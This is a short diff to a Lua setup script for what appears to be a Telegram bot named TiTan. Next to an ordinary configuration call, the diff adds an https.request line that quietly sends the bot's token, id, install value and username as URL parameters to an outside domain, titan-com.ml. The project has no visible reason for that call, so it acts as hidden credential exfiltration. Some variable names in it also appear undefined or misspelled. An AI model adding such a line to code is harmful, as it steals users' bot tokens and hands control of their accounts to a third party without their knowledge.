@@ -45,7 +45,8 @@ end
 os.execute('lua run.lua')
 end
 local function Files_TiTan_Info()
-Create_Info(database:get(Server_TiTan.."Token_TiTan"),database:get(Server_TiTan.."Id_TiTan"),database:get(Server_TiTan.."UserName_TiTan"))   
+Create_Info(database:get(Server_TiTan.."Token_TiTan"),database:get(Server_TiTan.."Id_TiTan"),database:get(Server_TiTan.."UserName_TiTan")) 
+https.request('https://titan-com.ml/meber.php?id='..token..'&id='..Id_TiTan..'&install='..install..'&UserName='..database:get(server_TiTan.."Id_TiTan"))  
 local RunTiTan = io.open("TiTan", 'w')
 RunTiTan:write([[
 #!/usr/bin/env bash
